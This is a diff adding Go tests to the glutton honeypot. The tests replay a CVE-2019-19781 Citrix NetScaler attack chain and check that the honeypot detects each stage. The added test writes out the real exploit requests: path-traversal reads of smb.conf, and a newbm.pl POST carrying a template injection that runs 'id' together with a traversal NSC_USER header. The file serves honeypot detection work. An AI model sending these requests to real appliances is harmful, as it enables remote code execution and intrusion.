@@ -1,6 +1,7 @@
 package tcp
 
 import (
+	"bytes"
 	"context"
 	"fmt"
 	"net"
@@ -11,6 +12,7 @@ import (
 	"time"
 
 	"github.com/mushorg/glutton/connection"
+	"github.com/mushorg/glutton/protocols/tcp/citrix"
 	"github.com/mushorg/glutton/protocols/tcp/pve"
 	"github.com/stretchr/testify/require"
 )
@@ -482,4 +484,125 @@ func sessionCookieFromHeaders(t *testing.T, headers http.Header) string {
 		}
 	}
 	return ""
+}
+
+// Synthetic CVE-2019-19781 chain modeled on public scanners (cisagov,
+// trustedsec) and exploits: fingerprint, probe, smb.conf, template write, fetch.
+func TestHandleHTTPCitrix(t *testing.T) {
+	withHTTPSessionIdle(t, 50*time.Millisecond)
+
+	client, serverConn := net.Pipe()
+	defer client.Close()
+
+	hp := newFakeHoneypot()
+	done := make(chan error, 1)
+	go func() {
+		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{TargetPort: 443}, &recordingLogger{}, hp)
+	}()
+
+	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
+	_, err := client.Write(httpTestRequest("GET", "/vpn/index.html", "", nil))
+	require.NoError(t, err)
+	status, headers, body := readHTTPResponse(t, client)
+	require.Equal(t, http.StatusOK, status)
+	require.Equal(t, "Apache", headers.Get("Server"))
+	require.Contains(t, string(body), "<title>NetScaler Gateway</title>")
+	sessionID := sessionCookieFromHeaders(t, headers)
+
+	_, err = client.Write(httpTestRequest("GET", "/vpn/../vpns/", sessionID, nil))
+	require.NoError(t, err)
+	status, _, _ = readHTTPResponse(t, client)
+	require.Equal(t, http.StatusForbidden, status)
+
+	_, err = client.Write(httpTestRequest("GET", "/vpn/%2e%2e/vpns/cfg/smb.conf", sessionID, nil))
+	require.NoError(t, err)
+	status, _, body = readHTTPResponse(t, client)
+	require.Equal(t, http.StatusOK, status)
+	require.Contains(t, string(body), "[global]")
+
+	form := []byte("url=http://example.com&title=%5B%25+template.new%28%7B%27BLOCK%27%3D%27print+readpipe%28%22id%22%29%27%7D%29%25%5D&desc=desc&UI_inuse=a")
+	write := httpTestRequest("POST", "/vpn/../vpns/portal/scripts/newbm.pl", sessionID, form)
+	write = bytes.Replace(write, []byte("\r\n\r\n"), []byte("\r\nNSC_USER: ../../../netscaler/portal/templates/aXJlZ2F\r\nNSC_NONCE: nsroot\r\n\r\n"), 1)
+	_, err = client.Write(write)
+	require.NoError(t, err)
+	status, _, body = readHTTPResponse(t, client)
+	require.Equal(t, http.StatusOK, status)
+	require.Contains(t, string(body), "parent.window.ns_reload")
+
+	_, err = client.Write(httpTestRequest("GET", "/vpn/../vpns/portal/aXJlZ2F.xml", sessionID, nil))
+	require.NoError(t, err)
+	status, _, body = readHTTPResponse(t, client)
+	require.Equal(t, http.StatusOK, status)
+	require.Empty(t, body)
+
+	require.NoError(t, client.Close())
+	select {
+	case err := <-done:
+		require.NoError(t, err)
+	case <-time.After(2 * time.Second):
+		t.Fatal("handler did not finish")
+	}
+
+	produced := waitProduced(t, hp)
+	require.Equal(t, "http", produced.protocol)
+	select {
+	case extra := <-hp.produced:
+		t.Fatalf("expected a single produced event, got another: %+v", extra)
+	default:
+	}
+	events, ok := produced.decoded.([]parsedHTTP)
+	require.True(t, ok)
+	require.Len(t, events, 10)
+
+	wantReads := []struct {
+		command, path string
+		citrix        *citrix.Request
+	}{
+		{"GET", "/vpn/index.html", &citrix.Request{Stage: citrix.StageLogin}},
+		{"GET", "/vpn/../vpns/", &citrix.Request{Stage: citrix.StageProbe}},
+		{"GET", "/vpn/%2e%2e/vpns/cfg/smb.conf", &citrix.Request{Stage: citrix.StageSMBConf}},
+		{"POST", "/vpn/../vpns/portal/scripts/newbm.pl", &citrix.Request{
+			Stage:    citrix.StageTemplateWrite,
+			NSCUser:  "../../../netscaler/portal/templates/aXJlZ2F",
+			Template: `[% template.new({'BLOCK'='print readpipe("id")'})%]`,
+		}},
+		{"GET", "/vpn/../vpns/portal/aXJlZ2F.xml", &citrix.Request{Stage: citrix.StageTemplateFetch}},
+	}
+	wantStatus := []string{"200", "403", "200", "200", "200"}
+	for i, want := range wantReads {
+		read, wrote := events[2*i], events[2*i+1]
+		require.Equal(t, "read", read.Direction)
+		require.Equal(t, want.command, read.Command)
+		require.Equal(t, want.path, read.Path)
+		require.Equal(t, want.citrix, read.Citrix)
+		require.Equal(t, "write", wrote.Direction)
+		require.Equal(t, wantStatus[i], wrote.Status)
+		require.Nil(t, wrote.Citrix)
+	}
+	require.Equal(t, write, events[6].Payload)
+}
+
+func TestHandleHTTPNonCitrixPathUntagged(t *testing.T) {
+	withHTTPSessionIdle(t, 50*time.Millisecond)
+
+	client, serverConn := net.Pipe()
+	defer client.Close()
+
+	hp := newFakeHoneypot()
+	done := make(chan error, 1)
+	go func() {
+		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{}, &recordingLogger{}, hp)
+	}()
+
+	// No traversal: a real appliance would not leak smb.conf here.
+	_, err := client.Write(httpTestRequest("GET", "/vpns/cfg/smb.conf", "", nil))
+	require.NoError(t, err)
+	_, _, body := readHTTPResponse(t, client)
+	require.Empty(t, body)
+	require.NoError(t, client.Close())
+	<-done
+
+	events := waitProduced(t, hp).decoded.([]parsedHTTP)
+	require.Len(t, events, 2)
+	require.Nil(t, events[0].Citrix)
 }
